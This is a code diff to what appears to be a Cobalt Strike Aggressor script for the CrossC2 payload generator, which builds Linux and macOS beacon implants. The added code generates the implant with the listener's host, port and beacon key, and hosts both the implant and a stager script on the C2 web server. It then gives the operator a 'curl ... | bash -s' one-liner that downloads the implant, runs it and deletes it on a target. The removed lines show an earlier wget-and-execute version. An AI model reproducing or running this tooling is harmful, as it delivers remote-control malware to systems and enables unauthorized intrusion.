@@ -23,20 +23,67 @@ sub random_string {
     return join('', @random_str);
 }
 
+sub getSystemInfo {
+    $process = exec("/usr/bin/uname");
+    $data = readAll($process);
+    closef($process);
+    if (strlen($data) > 0) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
+
+sub checkSpace {
+    $realPath = "";
+    if ($1 eq "null") {
+        $realPath = $1;
+    } else {
+        if (getSystemInfo() == 1) {
+            $realPath = replace($1, '\p{Space}', "\\\\ ");
+        } else {
+            $realPath = replace($1, '\p{Space}', "^ ");
+        }
+        if (find($realPath, '\p{Space}') > 0) {
+            $realPath = "'".$realPath."'";
+        }
+    }
+    return $realPath;
+}
+
 sub dialogCallBack {
+    elog("");
     $system = $3['system'];
     $arch = $3['arch'];
     $payload_type = $3['payload_type'];
     $listener = $3['listener'];
     $outputFileName = $3['outputFileName'];
+    $beaconKeyPath = $3['beaconKey'];
+    $rebind_lib = $3['rebind_lib'];
 
     $listener_info = listener_info($listener);
     $host = $listener_info['host'];
     $port = $listener_info['port'];
 
-    $process = exec("/xxx/xx/xx/genCrossC2"." ".$host." ". $port." null null ".$system." ".$arch." ".$outputFileName);
-    @data = readAll($process);
+    $outputFileName = checkSpace($outputFileName);
+    $rebind_lib = checkSpace($rebind_lib);
+    $beaconKeyPath = checkSpace($beaconKeyPath);
+
+    if ($payload_type eq "Staged") {
+        $outputFileName = $outputFileName." shellcode";
+    }
+
+
+    $genCc2 = "/xxx/xx/xx/genCrossC2.MacOS";  # <-------- fix
+
+
+
+    $genCc2 = $genCc2." ".$host." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system." ".$arch." ".$outputFileName;
+    elog(genCc2);
+    $process = exec(genCc2);
+    $data = readAll($process);
     closef($process);
+    elog("genCrossC2 beacon -> ".$data[13]);
 
     $handle = openf($outputFileName);
     $c2Data = readb($handle, -1);
@@ -45,27 +92,33 @@ sub dialogCallBack {
     $uri = $3['uri'];
     $lport = $3['lport'];
 
-    # host the script
-    $url = site_host($host, $lport, $uri, $c2Data, "automatic", "Scripted Web Delivery (wget)"); 
-
     $targetSaveName = random_string(10);
+
+    # host CrossC2 beacon
+    $payloadUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", "CrossC2 beacon ".$system." ".$arch); 
+
     $targetSaveName = '.'.$targetSaveName.'';
 
-    # tell the user our URL
-    prompt_text("Copy/Paste One-liner: ", "wget " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&", {});
+    # host script
+    $script = "wget -U 'O' ".$payloadUrl." -O /tmp/".$targetSaveName." && chmod 777 /tmp/".$targetSaveName." && /tmp/".$targetSaveName." && rm -f /tmp/".$targetSaveName;
+    $scriptUrl = site_host($host, $lport, $uri, $script, "automatic", "Script Unix Web Delivery (curl)");
 
-    elog("wget -U 'O' " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&");
+    # tell the user our URL
+    prompt_text("Copy/Paste One-liner: ", "curl -A o -o- -L " . $scriptUrl . " | bash -s", {});
+    elog("CrossC2 ".$system." ".$arch.":   curl -A o -o- -L " . $scriptUrl . " | bash -s");
 }
 
 sub genCrossC2 {
-    $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
-    dialog_description($dialog, "Export CrossC2 Payload");
+    $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", beaconKey => "./.cobaltstrike.beacon_keys", rebind_lib => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
+    dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
     drow_text($dialog, "uri", "URI Path: ", 20);
     drow_text($dialog, "lport", "Web Delivery Port: ", 20);
+    drow_file($dialog, "beaconKey", "Choose: default ./.cobaltstrike.beacon_keys");
+    drow_file($dialog, "rebind_lib", "Choose: rebind_dynamic_lib");
     drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "Linux-GLIBC"));
-    drow_listener($dialog, "listener", "Listener: ");
-    drow_combobox($dialog, "arch", "Arch: ", @("x86", "x64"));
-    drow_combobox($dialog, "payload_type", "Payload_Type: ", @("Staged", "Stageless"));
+    drow_listener($dialog, "listener", "Listener: (reverse_https)");
+    drow_combobox($dialog, "arch", "Arch: ", @("x64", "x86"));
+    drow_combobox($dialog, "payload_type", "Payload_Type: ", @("Stageless", "Staged"));
     drow_text($dialog, "outputFileName", "OutputFileName: ");
     dbutton_action($dialog, "Build");
     dialog_show($dialog);
